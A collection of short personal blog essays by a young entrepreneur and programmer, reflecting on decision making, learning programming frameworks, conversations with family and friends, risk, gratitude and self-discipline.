If you end up committing to one specific way of doing something, it'll
quickly became irrational without you even realizing it. As Taleb would
say, you ignore the massive *option *of realizing when something doesn't
work, taking the small downside and choosing a different process.

One way to do this, is to conciously remind yourself that things that
haven't materialized yet don't exist. I.e don't count the money until
it's in your bank account.

It applies to a lot of things in life. Also, assume that it doesn't work
(which a lot of the times will be the case), ask yourself, what will you
do? Once you know, it's a lot less daunting, and you can attack the task
at hand without worrying.

# Present Evaluations

I had this feeling, that got revealed to me while listening to a mentor
speak.

Oftentimes, an X thing happens that gives us an advantage.

I operate on this X, and it works great, but it can become really
troublesome if I no longer have that advantage.

It's hard to let go of X, and because of that you only choose things
that you would as though if you had X. But those are wrong choices, so
it gets worse and worse.

When making choices, make sure you are objective to your current state,
advantages and disadvantages.

# A new principle on books

I have read probably hundreds of books by now, and it has proven to be a
boon in my life.

Recently I realized two things ---

I often don't read books that are specific to my craft. I usually read
books on philosophy, marketing, meta-like lessons.

Though that's great, if I add technical books into my system, I can
develop a much deeper understanding of computer science fundamentals,
which would sement a lot of what I am learning. Also, if I want to be
able to work on something great and invent, I should probably know
what's been invented.

Another thing I can do is to make it more systematic. For example,
almost all books in my mac kindle app get read, but PDFs rarely get read
--- I keep on losing track of where I was.

An easy fix to this is to just buy a kindle :P.

Also, I'm going to start tracking how much I read --- I want minimum 15
hours a week ( about 2 hours a day, which is easy to fill up while
walking around, etc )

# Another reminder to myself

I was speaking to my mom, and she was telling me a story about how she
was frustrated with something.

I kind of over-reacted, tried to fix the problem, call her out when I
thought she was wrong --- etc.

She's super kind and gracious, so she didn't say anything about it, but
I know that's now what she was looking for. She was looking for someone
to listen to her.

When I next speak to someone, first, I'll make sure that I can be fully
present. Second, I'll ask myself what the other person's objectives are,
and what I'm trying to accomplish by talking

# Risks in all areas are not the price for living a different life

I was reading Tynan's posts <http://tynan.com/precarious>, and had to
disagree slightly with him here.

It's not necessarily the price to pay. I think it's very unhealthy to
have all areas of your life in a risk state. Rather, have a bunch of
risks, downplayed by a bunch of safe bets. I would actually argue that
him living in an RV, even with the possible trouble with the parking
spot is a very safe bet, when compared to paying 3k/month in an SF flat.
It's what allows him to take the other bets.

# My approach to learning MVC's and all other things programming

One of the best ways I've found to learn new programming techniques is
to break them out into a curriculum like structure.

**First, scower the web for preparation material.** The best place to
start is usually their documentation. Use that as your base material for
the 'preparation part of the day'

**Second, scower the web for DIY material.** Find the build X simple
thing using Y style tutorials.

Put out a day by a day plan, that should look like this ---

about 2 hours worth of plain preparation material. I.e reading
documentation.

Then 8 hours worth of doing material --- I.e build x thing with Y.

**Third, in about 3 days do a final project.** This is something you
thought of yourself. It should be simple, but enough to stretch your
muscles. If you can build it, you're on a good start. If you can't,
repeat the previous process.

# When to fight

What I'm going to say is controversial, but it's been one of the biggest
advantages I've been able to gain, and I see people I love making the
same mistake I was.

When I was young, If someone treated me badly, wronged me, or did
something wrong, I'd unsheath the sword and fight.

This can be fine if you pick one thing, and you devote your entire life
to it. If you see something wrong with the world, and you fight to
correct that wrong, it's a noble pursuit that's worth taking up.

But, what if your interests lie elsewhere? What if you want to be the
best craftsperson, or a business person, doctor?

With every fight you open up, you have to devote resources to winning
it. If it's something that society at large believes, then you'll have
to deal with ostracization effects.

The common response when this happens is 'I don't care'. Oh whatever, I
lost X deal, but I don't care, she did Y thing wrong.

There's a fine line here --- you can't ever cross your morals, or let
anyone else beyond boundaries you're comfortable with. However, if you
don't want to devote yourself completely to the fight, don't dive
completely into it. Use the metaphorical 'counter'. Deal with it
swiftly, ignore the jabs and act quickly to get what you want and end
the fight.

# The Blank Page

Learning new things, in it's infancy has one of the wierdest qualities
--- it takes a LOT of effort to just *start.*

You do other things, anything to prevent you from sitting down, and
trudging through the confusion and discomfort that you have to face.
With learning new languages (both computer and human) and skills, you
have to face this moment of 'f\*\*, If only I could just use what I'm
comfortable with, this would be done yesterday'

But, inevitably, after an hour you get yourself in flow, things tick
together, and you can't imagine going back.

Remember that when you start. The growing pains, unsurprisingly, help
you grow.

# Watch when you make your choices

The emotions you're feeling drastically color both your interpretations
of the past and the future.

I remember Dan Gilbert saying something to the tune of, if you're
feeling bad, most memories you recall will feel bad and vice versa.

This can have huge implications when you're dealing with campaigns. What
happens if you get a bad email? Your brain can run at a hundred
kilometers an hour, thinking up what's really most most distant to
reality. i.e Instead of someone being on vacation, maybe their making it
up :O.

The best thing to do in this situation is nothing, simply go and talk to
a confidant. Rest.

Afterwards, write down what the worst thing that could happen is. Also
write down the best, and what's most likely. Then, with that particular
run with somewhere between the likely and the best. Spend the rest of
your time countering the worst.

Make sure to never bear your fears and frustrations on the campaign
itself; i.e don't go to your clients and start spooking them with your
machinations. This is way more common than you'd think, and most people
that do it don't think they're doing it. They think they are responding
to a threat, but that threat is nonexistent most of the times, and if it
was the strategy that's used wouldn't be a good strategy anyways.

# Focus on intention, not words

When you speak, it's often easy to be afraid that another person might
misinterpret what you're saying. I've found that this very fear kind of
builds on itself --- your conversations aren't as crisp, and people can
notice.

Try to simply make sure the intention is correct, and say what you like.
If at any point it's misinterpreted, just lightly correct it, without
taking offense. You are certain in your intention, so speak with it.

# Unpleasant things as a learning resource

I consider myself to be one of the luckiest people in the world. A lot
of people start in the slums and build their empires. I can't in anway
say that's the case for me. I hit the lottery with my parents, friend,
education, opportunities, you name it. I sent an email when I was 18 and
got sent to China because of it...

Recently something less rosey happened --- I received 2 offers from what
would be considered the mecca of tech industry startups. But, I might
not be able to accept them because of Visa issues.

This kind of sucks. These offers were a result of me deferring
University to go and build a business in China. I wanted to prove to
myself that I was good at my craft, and to build the credibility that I
wanted.

But, in a different perspective, it's helping me grow like crazy. First,
in my skillset. My skillset isn't what I would consider a mind-blowing
level. There's no room for slacking off and leaning on credibility, time
to level it up. My hustle was good, but time to use some creativity to
expand horizons. What am I not doing? How can I achieve my goals. where
can I learn, how can I creatively attack?

How can I blast through this, foot forwards and sword in hand?

This ethos has resulted in this week being one the most interesting
weeks I've had. For the inspiration behind it, I encourage you to read
Ryan Holiday's 'The Obstacle is the Way'

# The Football player and the UN Speaker

About 3 years ago, I was reading one of Cal Newport's blog posts, and
this parable stuck with me and helped guide a lot of my outward-facing
campaigns.

Imagine 2 hypothetical people.

Person A is the start football player in his state.

Person B made a speech at the United Nations?

Who's more impressive? Most of us answer Person B, but why?

In order for Person A to become a start football player, he essentially
ahd to spend all of his high school years waking up at 6AM, practicing
relentlessly, beating out other competitors, leading his team.

Person A did not shy away from work, so why do we think Person B is more
impressive? It's very unlikely that person B would have had to work as
hard as person A.

So what's impressive about person B?

It's impossible for us to replicate his path the United Nations in our
brains. We immedietly discount anything that we can figure out.

So, when we ask ourselves, how would *I* go to the UN, your answers turn
out blank, but with Person A you can imagine yourself waking at 6AM.

When telling your narrative, try to see how you can fram it as being
person B, rather than person A.

# Control your excitement for more effective conversations

I've noticed a pattern both with my outreach related communication, and
with personal communication.

When you want to convey power, excitement and talking too much almost
always lead to subpar results.

From obersavation, over-excitment leads to two downsides. The first is
that you end up talking more about yourself then the other person. The
second, you forget to think about what the other person wants out of the
conversation, or what you want to gain as a result of the conversation,
but instead just want to flow with your excitment.

Don't get me wrong, being excited about what you're doing offers
tremendous benefits, but it's detremintal when you're in a converation
that has any goal other then showing the other person that you're
excited about something.

Remember how great you feel when you're talking and are excited; imagine
if you could make other people feel that way. That can be the stretch
goal to your conversations; check hyperactivity out the door, keep a
paced converastion, and reach deep to understand what the other person
is excited about.

# Keep a 'what's my answer to this' file

I've realized something that I've been doing only in a scattered way,
but every time I did it, it turned out to be a wonderful boon in my
life.

In our lives, it's pretty common to go over the same converation
multiple times. When that converation is an uncomfortable one, we
predicatbly fail at it every single time.

I.e when you meet someone, how do you start a conversation? Most people
just end up talking about what they do, and it's not the best way to
build rapport. We think we'll be creative in the moment, but we just end
up saying the same thing.

So, let's keep a swipe file. How about ' Hey, how did you and X meet? '

Or, when speeking to a mentor at a conference, instead of blaberring
about how they're your hero and ending the conversation, why not ask
them 'Hey, who do you learn from?' (Saw this is one of Ramit Sethi's
emails, this is gold).

These are generic to everyone, but where this comes in super handy is
with specific touchy points that some of us have. For me for example,
it's about discussing University with my parents. I always end up
becoming slightly defensive, and can't really convey my point across.
Time to fix that!

# What's under your control

What's under your control, and what isn't?

There are some things that will not be under your control, but the
amount that is will surprise you.

When you find out what is under your control, devote all of your energy
to it, it's the ultimate remedy for sleeplessness :P.

# Youtube on Repeat

I was about to make an app that would put my current favorite work music
video on repeat. Then, I found youtubeonrepeat.com .

I've found productivity increase when I listen to one song on repeat for
the time I'm working, it gets you in a really good flow.

Give youtubeonrepeat a whirl :)

# Tubby Sinatra

For the longest time I've used rails even for the smallest projects.
Mostly because I love it's power. Sprockets, ActiveRecord... oof.

But the time came when I used Sinatra, and it was really beautiful to
have such a thin framework. To use it more often, I added over
ActiveRecord and Sprockets. If you'd like to give it a whirl, you can
take a look at the spin up here -\>
<https://github.com/stopachka/tubby-sinatra>

# Don't wear trackpants when you want to get shit done

Okay, today, I got little done other then lose my wallet.

I reflected on it, and to be sure there's a variety of reasons, such as
not having clearly defined goals, getting side tracked by losing a
wallet, etc.

But, a really sneakily big reason whether it's a result of the above or
an action of it's own right, was that I was dressed slopily.

When getting shit done, there shouldn't be much spent thinking about
other things, or fighting uphill for arbirtrary reasons. Making sure you
take care of all arbirtray reasons for maximal effectiveness.

# For better negotation, event out your relative times

This is something that many of us had a problem with --- You're waiting
for an email from someone, and a day passes since their latest reply.
Anxiousness, rises, another day passes, oh my god! Now theories start
developing, and those theories can lead you to your downfall.

This is due to the difference between your relative experience of time,
and their relative experience of time. To them, because they are less
invested the the days go by much more quickly. For you, you think about
the event more, so your days go by much, much slower.

For more effective negotiation, aim to be just *slightly* faster then
the other person. This takes the benefit that you will be moving things
forward, but won't sabotage yourself by trying to move too quickly.

How do you speed up your relative experience of time? Create other
things to think about. When your waiting on action from other people,
ask yourself if there's anything else you can do. If you can, start
working on that, and this will push them to respond faster anyways. If
there's nothing you can do in that campaign, do things that will
increase your overall strength. If you're in a negotiation with a
consulting client or employer for example, and there's nothing more you
can do but wait, just coding on OSS projects is an excellent use of your
time, or learning a new skill.

# Notes on making choices when you have a complicated decision tree

Most treastises on decision making tend to isolate choices. Take pros
and cons, etc. But, what happens when you have many multiple choices,
with each accomplishing different goals? I noted down below somethings
to remember, when making choices.

1\) Know what you want out of each choice. What are you willing to say
yes to, and what are you will to say no to?

2\) Know what you want in the end

3\) Write out the whole tree as best you can, if you feel worried.
However, don't concern yourself with anything other then the immediate
choices.

The last one is the most important for me. Ask yourself, what can you
do? And go ahead and do those things in priority order. Only think about
the highest priority thing, until you're done, or for some reason can't
take action on that and still have free time, then only think about the
second one.

# Limit your choice loops

One of the biggest drain on our energy and satisfaction is having open
decision loops.

What I mean by that, is any choice that you're unsure about, and keep on
thinking about it in the back of your mind. The back of mind thinking
reduces your satisfaction, and doesn't contribute to a clearer choice.

Another version can be having to think about a choice that you can't act
on yet.

Both of them are fruitless to think about, as they don't increase your
effectiveness at all, they only contribute to overwhelm.

To have a better time with them, attempt to close open decisions as fast
as you can, and prevent yourelf from thinking about decisions that you
can't make yet.

# What you don't know you don't know

Not sure I can give the whole credit to Taleb, but he strongly enlivened
the the idea I had in my head about Things people don't know they don't
know.

When you already know something, you can take action against it, so it
can't really hurt you, in that it won't be a surprise.

However, there are inifnitely more things you don't know you don't know,
which is guaranteed to have an impact on you. Perhaps if you're in
technology, it's what you're not learning that's going to explode and
become common place.

To expose yourself to the most positive outcomes, attempt to expose
yourself to as many things that you don't know as possible.

# Expand your sense of belonging

I don't know if this applies generally, but I've noticed it in myself
and many of my friends in similar pursuits.

As an entrepreneur, an artist, a person pushing to create something, or
maybe just as a person in general, the world can become a lonely place.

I remember finishing a conversation someone intimately close to me.
Until then I felt that I was 'understood', but the conversation proved
otherwise. I finished the conversation, and it was the first time I felt
tears in two years.

I didn't feel that people understood the reason why I was doing what I
was doing. Everyone felt very far from me.

This is was completely self imposed. Consider the following when you're
thinking that ---

**1) You are not a special snowflake.** There have been many people
before you, and after you, that thought the same thing you did, and
moved forward. These have been recorded for thousands of years in books
that will prove to be invaluable to you. Find friends there.

**2) People understand you, but they don't know that they understand
you.** When you're doing something scary, it's natural for someone who
loves you to advise you against it, to choose the 'safer' path. Take
that as love, for that's all that it is. It's not worth arguing over. If
it's an elder who is advising you, understand that they took risks when
they were in your position, but they don't see it the same way looking
back. Feel belonging in joining that tradition.

**3) Feel belonging with your purpose.** Even if people don't understand
why you're doing something, feel belonging that you want to accomplish
the same thing. To create happiness, to become a beter leader. If you're
doing something hard, the results are worthy.

# Knowing vs Doing

Ever since I was about 15, I kept a journal. It was my mode of
reflection, planning, and recording the 'lessons' of life.

There was a glaring pattern I noticed, which has influenced a lot of my
descision making. About 8 months ago, I was changing between notebooks,
and dealing with some challenges in business and personal life. As I was
doing this, I had a flash of insight and started writing a lesson about
how to interact with others. Out of curiosity, I also looked back at a
few past notebooks, and realized that I already wrote that lesson. It
was as though I was rediscovering everything all over again.

Almost all the challenges that I had, the previous me had the same
answers to them, but I had yet to implement them and the problems seemed
different on an artificial glance.

This is where the knowing vs doing seperation was so apparent to me. I
could know the right way, but consistently act in the wrong way.

Knowing isn't enough. That's a big part of it, but implementation takes
much longer, much more awareness and effort.

# The trap of accepting too quickly with high upside endevours

Taleb explains this phenomenon the best with an analogy.

Imagine you put a 1000 people together, and you'd like to take the sum
total of their weight.

Even the most heavy person in the world, if they were in that sample,
would only constitute at most 0.5% of the weight.

Now, intead, say we were to put a 1000 people together, and were to
measure the sum total of their *wealth*.

If we include Bill Gates in that sample, the rest of the 999 are simply
rounding errors.

This is to portray a type of scenaraio where there are massive wins that
outweigh a lot of losses.

I think that for most of our lives we were trained to predict in the
first type of scenario, but don't do as well in the second type of
scenario. This became very apparent to me in an outreach related
campaign that I'm doing. Recently I've received offers in that campaign
that seem very good, but I know that I won't take them. The reason being
that the longer I stay in the game, the higher the chance of an unlikely
but immense upside.

This is really interesting to consider, when trying to do high upside
outreach related campaigns

# The Finisher!

Be the finisher. It gets so hard when you're 90% of the way there. It
feels like any new task is going to take twice as long as it took you to
get here, entitlement kicks in, fear kicks in.

But, get that shit done. Be ruthless about it, launch.

# Choose what bugs you

How well do you fit the vision of success?

What schools did you go to? What awards did you win? Where do you stand
in the pecking order? How do does your body measure up to the golden
standard?

The pressure to conform. It can be debilitating, and it can be vexing.

Until you choose that is.

Choose what you believe your success is. Choose to stand *above* what
the masses believe, not lumping on the side and hoping to find
confirmation.

You can only feel the pressure when you *believe* that success actually
is what's in society's common knowledge. Stand aside, and define the
stick that you measure yourself against.

# A habit of tracking core work

It's been reaffirmed to me over and over again, that it's consistent,
focused practice that leads to improvement and mastery. It's when you
are working on what you don't know yet; stretching.

It's also this improvement, and knowledge that you will become better,
that is instrumental to overcoming hurdles.

It can be immensily useful to track this! Every week, how many hours of
focused practice am I putting in? I can take solace in the number, I can
be inspired by that number. Right now I'm not sure what that number is,
or how I'll implement it, but I wanted to write this down to start to
get a sense for it.

**A potential formula**

*After riffing on this a bit, here's a potential structure ---*

Every day, put in 3 focused hours to working on a hard coding problem,
or learning a new technology.

Find a place where you will only do this; There should be no
distraction, and it should be easy to start

Figure out what you want to work on before starting out on the 3 hours

I feel like this is most applicable to me in my technical skillset, but
I couldn't see why a business oriented person couldn't adopt the same
strategy.

# Getting Better

I think I wrote something similar to this about a year ago, but I'm
writing once more to meditate on it.

One of the most frustrating fact are that when you reach 90%, but
because of the last 10% you don't achieve the objective. From outreach
related goals to personal relationships and the list goes on. You do
everything right, but something in that elusive 10% eludes you. It can
be frustrating.

But, take solace in the fact that the 10% is a skillset issue. It's much
better that it's a skillset issue, because then you can address it. Be
prepared though, becayse that 10% can take twice as long as it took you
to achieve that 90%. That's why all the wins come after it.

Become aggresive about deep work, and become aggressive about people
critiquing your work. See what you're missing, and reach out to the
people that can guide you in the right direction. Nothing is a better
medicine then work, at least when it comes to this malady.

# Patience

This piece of advise can act against some people; If you have a lot of
trouble following up for example, this post may not be for you.

However, there is always the person that follows up to quickly or
rashly, and loses as a result. Why is that? What's the difference
between following up well, versus being too forward?

I think it's mostly about the intention behind the follow up. If you're
anxious, it's never a good idea to send an email or call. Notice how I
didn't see, almost always, or some of the time. No, it's ALWAYS a bad
idea.

Follow up with when you're level headed, and you're doing it because
it's what it takes to move the ball forward.

# When you say it's done

In high school, I had a friend who was a phenominal artist. He drew a
portrait of me, and it still hangs in my family's house.

His portraits were extremely realistic. You could tell that not only he
was good, but he put thought and care in his work.

One day, I got to watch him create a piece of work. Two hours in, I was
surprised, because the work didn't look that great. I felt like I could
do the same thing. But, he didn't stop there. Two more hours, refining,
refining. Two more hours. Two more hours.

And then there came out a masterpiece.

When doing work, I try to remember this. If you want to create excellent
work, you'll be going through a process. The first time it might not be
so good. But, don't get disheartened, it's a necessary step. Time to
refine.

# AngularJS Learning

I'm beginning on a short quest to get rocking with AngularJS. I did a
sort of curriculum-like method for learning Ember, and it turned out
really well.

My writeup for that was reflective though, and I'm sure I either missed
some parts, or unconciously distrorted it to a fit a narrative. This
will outline the steps I'm taking, as I'm taking it.

===

**1) Google search Angular learning resources. Found a great intro video
to get started ---**

**2) While watching video, also discovered a quick codeschool course on
it**

\<http://campus.codeschool.com/courses/shaping-up-with-angular-
js/level/1/section/1/video/1\>

I'll probably do this right after. The reason I don't jump right into
making an MVC app is because I'd like to have a slightly deeper
technical understanding of Angular and it's best practices.

**Update on 2) ---** Wow! I really enjoyed this tutorial. Excellent way
to cover ground. When taking it, I suggest you make your own local
version of the app that you'll be creating on it. It'll help you
internalize much better.

**3) Time to look for tutorials on integrating Angular with a backend**

I've got an understanding of Angular's core features, but one open
question is how Angular handles data via a RESTful API. I'll be
searching for tutorials on making it. Another question I have is about
how to best structure an app using angular, and when to use custom
directives, etc. I think to get a better sense of this, making an actual
Rails App would teach a bunch.

Right now, I'm thinking of making an app to save all of your favorite
ideas, but before getting into it, I have 2 other considerations to
think about. There's a coding challenge I'll be at in a few days, and
I'd like to set up a dev environment for it. Once done with that, I also
want to knowt the basics of react.js. Before any of that, I also have a
bunch of consulting work to finish off.

Will be back on updating this post in a few days.

**4) Teach Allen a what I learned**

While doing the immediete client objectives, I moved along with Angular
learning, with an interesting experiment --- a great coder friend of
myne and I have been switching roles as teachers to eachother --- this
time I taught him what I learned with Angular. It helped cement some
thoughts, and exposed what I didn't know. Very useful.

**5) Discovered Great Rails and Angular Tutorial**

Was scowering around for a tutorial that would help cement routing and
services for Angular. Usually there's always a 'build a blog with x and
y' tutorial, so I searched it up and found something excellent -\>
<https://github.com/asanderson15/rails-angular-tutorial>

# A Different look at goals

Ever since I was 15, I would write a 'manifesto' every six months. It
included lessons learned from the past, and a new outlook on objectives
for the next six months.

Today, I opened my notebook to plan the next 6 month's objectives. To
start, I wanted to get a better sense for what the future held, so I
drew a timeline. On that timeline, I filled in my 'must do's', the
things I was certain would need to be on the calendar. On the side, I
put all potential goals.

This produced some surprising results for me. For my 'must to do's', I
had only about 20 days filled. And for my potentials, everything seemed
to be up in the air, dependent on each other. The possible combinations
were too varied to think about.

For most of my life, I had much more must do's, which allowed me to more
clearily make choices.

The skills needed to make choices in that scenario aren't so useful in
this one.

So, what does work? The first thing that comes to mind is to ignore all
choices that depend on other choices --- they are too up in the air, and
the number of possible combinations will make your brain explode.

Only focus on the decisions you can immedietly act on.

However, this can introduce a secondary problem, where by focusing too
short- term, you end up missing out on longer-term investments.

A perfect example of this, for me, was language learning. For the first
year that I was in Beijing, I didn't put much effort into learning
Mandarin. I was more focused on business and immediete goals, and
thought I wouldn't have enough time to become fluent. One year passed, I
started learning Mandarin, and boy do I wish I learned for that year!

so the soluton looks like, focus on more immediete decisions, but assume
that you will be in your current state for longer. This way, you won't
put off objectives that will take a long time.

# When to make your move

When I was 17, I applied to two universities; the best ones in Canada,
and got into both of them with scholarships. I ended up choosing not to
go, and took a bunch of opportunities that I thought were excellent for
growth.

When someone young asks me if they should drop out though, I often
advise against it. I've been thinking about why that is ---

I think my story can be contrived as courageously taking a bunch of
risks, but that's not the case. I had been working with computers since
I was 10, and trying to build businesses for years before that. I didn't
jump into the abyss, I jumped into someone paying me money to learn.
Afterwards, I didn't jump into the abyss, I jumped into working to build
a business in China with a veteran.

If you're young, and you want to make a jump, I'd advise against jumping
straight into the abyss. Instead, work harder at getting better at your
craft. As you get better, opportunities will come up, and instead of the
fear of jumping into the abyss, you'll be dealing with the fear that
you'll be missing out on thousands of opportunities unless you go.

# The feeling comes first

I was having dinner with an excellent friend of myne. He is one of the
few people that I think is weirder than I am.

I asked him, don't you get lonely? I mean, I don't think many people
understand you.

I was stunned when he said it didn't bother him at all.

I couldn't accept the answer, so prodded him for more.

He said that he didn't trust his assessment of why he was feeling
something.

He gave an example --- maybe one day all of a sudden, you get this
feeling of restlessness. You worry, loniliness kreeps in.

Then, you ask --- why?

Your brain produces a result. Ah, it's because no one understands me, ah
this, ah that.

But, your brain made that up! You got the feeling first, then you
rationalized afterwards.

Challenge the rationalization.

Instead of what your brain comes up with, go for a run, rest, sleep, get
better, talk to your friends. Instead of accepting an explanation, test
and base your choices on the external world.

# SICP, beautifully displayed

On top of my list of programming books are Introduction to Algorithms,
and Structure and Interpretation of Computer Programming.

For me, when reading textbook-style writing, it's important to have 2
things: the first, an easily digestible way for me to consume the media
and know where I was at last. Second, an accountablity trigger.

Fortunately, Eden and Aaron, two great friends that I mastermind with,
were also into reading SICP. We ended up starting a group learning
campaign. Because we're all across the world, we're using it as more of
a way to keep eachother in check, and to ask about the tough questions
during debriefings. This is the best plan in my opinion.

If you're thinking of giving it a read, you need to check out
[http://sarabander.github.io/sicp/html](https://sarabander.github.io/sicp/html)
. It's beautifully structured, which makes the whole experience 10 times
more fun.

# Big stretches of time

One of the biggest reasons I find myself in procrastination with hard
problems is when I don't give myself ample time to work on them.

Say you wake up, and you have a meeting at 11, and another meeting at 3.
It may seem like you have a lot of time for the rest of the day to spend
on a hard problem, but your brain knows better. It's too afraid to start
because it knows you'll be interrupted.

Avoid these types of schedules if you can; perhaps bundle all calls /
meetings on one day, or towards the night.

# The value of congruency

When we're kids, it's easy to think that everything you think is the
right choice and you're making a hero's decision.

How do we know? The fact is that as a kid you don't actually make any
decisions, so you never know how you'll actually act. You are good in
all aspects, but it's an unprovent type of good.

I got really lucky in that I had excellent mentors when I first ventured
out into business. You'll inevitably be confronted with situations were
you could easily convince yourself to let your values slide; in the
moment it won't even look like it. If you let it, your brain will be
quick to make a rationalization.

But, this is where you define the type of person you are. It's immensley
worth it to make the right choice. How much is it worth to you to be
incongruent with who you are?

The answer for me is that congruency is priceless. I'll write a bit more
on this later, but in short, it offers excellent value. The first is
that you will be happy with yourself, you will honestly be someone who
you yourself respect. The second, is that you will build up your ability
as stakes get higher, and making the right choice there will create
immense wins for you.

# Bound by Uncertainty

One of the most obvious observations about high upside events is that
they are unlikely.

What do I mean by high upside events? 2 types come to mind. The first
could be doing something uncomfortable, with a very low chance of
success, something like applying for very prestigious schools or
companies, incubators, etc. The second is doing great work.

I kind of cheated in putting great work under high upside events, but it
follows the same principle that I'm about to get into, *comfort.*

When you're doing great work, it's tautologically uncomfortable. The
work wouldn't be great if you didn't think the problem you were solving
was hard. You might have to learn a lot of new things, or have to face
the dreaded 'am I good enough?' question.

When you're doing high-upside, application oriented events, you also get
the same feeling. If we liked writing applications and selling, we would
be in sales and no development.

Then it follows the limit to doing great work, or winning in a high
upside event is bound by the level of uncertainty you can handle.

Take applying for excellent schools or companies. The excellent ones are
the ones that are least likely to be particularily impressed by you.

This gets us to sell too quickly. In order to avoid the discomfort, you
might be tempted to take the very first offer, or to choose an easier
challenge that doesn't quite make you work as hard.

And the thing about the level of discomfort you can handle is that the
choice becomes an unconcious one. It's not that we choose to settle
early, or take on less challenging pursuits, but they become a default,
rationalized behavior.

The way to get yourself out of it is by watching other people. If you
see someone at your skill level is doing harder things, or getting
better results, it most likely that he can just handle more discomfort
and uncertainty.

# Impediment to Action

What do you do when something unfair happens to you?

First, remember that all impediment to action reinforces action. Use
this to make you stronger. Get much better.

Second, use this as an opportunity to practice your ability to handle
wackiness. Everyone can be a CEO when it's smooth sailing. This is your
chance to prove to yourself that you can be creative, you can deal with
hard things.

Third, find opportunity from constraint. Okay, if X won't work out,
let's ask, why did you want it? Because of Y. How can we get Y?

# Invest

When young people think about investing, we think about someone wearing
a tuxedo talking about tax free savings accounts.

Tax free savings accounts are actually pretty awesome, but that's not
what we we should be thinking about.

As young people, we don't have much money that we can leverage for
investment, but we have something immesnley more valuable. We have time,
and unending drive.

How can we use this well? Well, we can draw from lessons used in
investing money.

When you're investing money, the more you wait, the more time your
investment has to compound. That's what we want for our time capital.
There's easy work that pays a lot, and there's hard work that can help
you grow. Choose the latter for as long as you can.

# Pete Hunt on React.js

<http://codewinds.com/podcast/004.html#episode_notes>

React.js . It could half your latency in most MVC apps. 'nuff said! :)

# When you're cranky

Are you present?

Are your thoughts with the present?

Do you feel gratitude and kindness to those you love?

Have you slept well, and exercised?

# The seed of regret

Could you have done better?

That is the seed of regret.

Don't let yourself ask that question. Do the best you can, always.

# Presence and Technical Ability

I've been in a technical phase for the last while. The more deeply I
learn, the more prone I am to be incognicant of others, and unable to
cultivate deep centreness and presence.

I wonder why. I think what we normally consider balance might be
antithetical to deep technical work. When you're working deeply, you
need intense focus, and your brain needs to be immersed in a different
world. It's the opposite of presence.

I don't know how to deal with this realization. It isn't worth it to be
present if I can't get what I want, which is deep technical growth. But,
deep technical growth isn't worth being irratable and constantly in a
different world.

If you're somehow reading this, and you have thoughts on this, please
send me an email.

For the minute, I continue to ponder the right path.

# Jumping thoughts

One pattern of thought I've noticed that is particularily unproductive
to all that is good is chronic thought switching.

You have 4 things to do. You start on the first thing, but by the time
that you start, you start thinking of the second thing, and it continues
in a circle.

It can drain your energy and morale.

When this happens, acknowledge it, and know that even though it's hard,
if you force yourself to just do one thing, you will feel much better

# Vitality

When I have the most fun, I'm doing a lot, I'm on the attack, having
fun, trying to be the best at everything I do. Trying to bite off more
than I can chew.

I wonder how life would be like if I could just live like that forever.
It might be worth a try. I don't want to get tired, or discouraged. It's
almost like I wish I never even heard of those words, so I wouldn't try
to fit my thoughts into them.

If I didn't know what depression meant for example, anytime I felt low I
could just think I needed to workout more. That might be more correct
anyways!

# Gratitude

I feel like I'm held up by giants.

My father.

My mother.

My sisters.

My mentors. You know who you are :).

My friends. You know who you are :).

It's scary to ask of people. I'm always scared to do that, but when I
do, I'm astounded with how many people I have who support me.

Thank you. You know who you are!

# Official

An interesting aspect of living as a child is that everything to you is
concrete. Adults make it so. They don't want you to worry about the
ambiguity that lies in your finances, love, and the future. Your
thoughts as a child wouldn't be awfully useful at best and would scare
you completely at worst, so it makes sense why they do this.

It's surprising how we've carry that through though. There's no magic
wand that shows us ambiguity as soon as we turn 18. We still look for
concreteness and balk at most things that don't have clear answers. This
can be especially dangerous, because now we're biased towards safer
actions. No matter how ambitious you are, it's tantilizingly attractive
to take the choice that would safeguard our sense of the world.

What does this mean?

If you're making a decision between two possible paths, choose the more
ambiguous one. You have so much bias towards safer paths that If you're
even considering the alternative, it must be the better choice.

Secondly, question the safeness of things. If something seems awfully
safe to you, it's your childish self choosing to ignore the ambiguity.
It is never as safe as a child would think, so it's better to look it
with keener eyes.

# Weird temperament

I'm not sure this is universal, but I see this as probably one of
stupidest flaws I have.

I can be antaganous in conversation with people I love.

An example of what I mean --- My family and I got into a conversation
regarding the merits of Europe and America. They noted off handedly that
people in Europe were more refined (this is paraphrased, we were
speaking in Georgian, and the meaning of refined is slightly different).
I deliberately underminded what they said, and made a very strong
statement --- like I *hate* beauracratic, class based systems.

Now, that was not what they meant. Thankfully, they're my parents, and
they love me, and they don't seem to share this temperament, so they
calmly moved the conversation elsewhere.

But why did I say that? I would usually defend this in the name of
wanting to convey something that will be better for the other, but today
I realized that's not the case.

It could better be described as me trying to get a rise out of them.

But why?

Well, I guess the way to narrow the search is to look for things that
were outside of normal that day.

First, I had a sore throat.

Second, other things were on my mind.

Both chipped away at my frontal lobe, is the best way I can put it.

Presence and cognicance. Maybe it's not even worth having a conversation
without them

# 2 types of pride

I don't remember where I read this, but it stayed with me ---

People can have two types of pride. The first prevents them from action.
This is what you see when people don't do things because they consider
it 'below their status', or something like that.

The second prevents them from not taking action. This is when you need
to do something, because you said you would, and you're too proud to go
and make excuses.

The second type of pride is worth it all, the first needs to be cleansed
from your mind.

# how other people view you \| how you view other people

Let's take an arbitrary fact about the world: People will judge you by
the way that you dress.

Now, what if you don't believe that superficial appreances are the best
way to judge people?

The gut reaction is to just wear whatever you like. But that's going to
impede you in getting what you want in the world.

The answer that I've come to is this ---

Dress well, because you can't control how other people judge things.
But, hold strong in your conviction --- never judge someone else based
on their appearance.

I tend to generalize this thinking into most beliefs.

# Is there any merit to arguments?

For the chunk of my life up to 24 hours ago, I took this idea as a given
--- arguments are always worth it. Why? My assumption was that the more
arguments I had, the more likely I was to change my mind, and therefore
see reality, be smarter.

But, I think arguing, at least verbally, may have an opposite effect.
When you argue with someone, you're invested in being right. It's
painfully to be wrong in a social context, and perversley it's like a
competition. I imagine it's similar to what gorillas or teenagers do
when they see a woman.

The second effect that can be argued, the noble act of changing
another's mind for the better, is also nil. I don't think I can think of
a time where an argument helped change a person's mind. Why is that?
Well, the first idea that people get emotionally intrenched applies, but
also I think changing your mind is immensley difficult, and therefore
requires something of equivelant weight. Arguing isn't good enough. It
needs to be more visceral, to be seen.

So, how should you approach it? I think writing essays to convey your
thoughts might be a way. I also think showing with action is a much
stronger way. In anything I've been good at, no one listened to me at
first, but when results showed, it became easy to speak my thoughts.

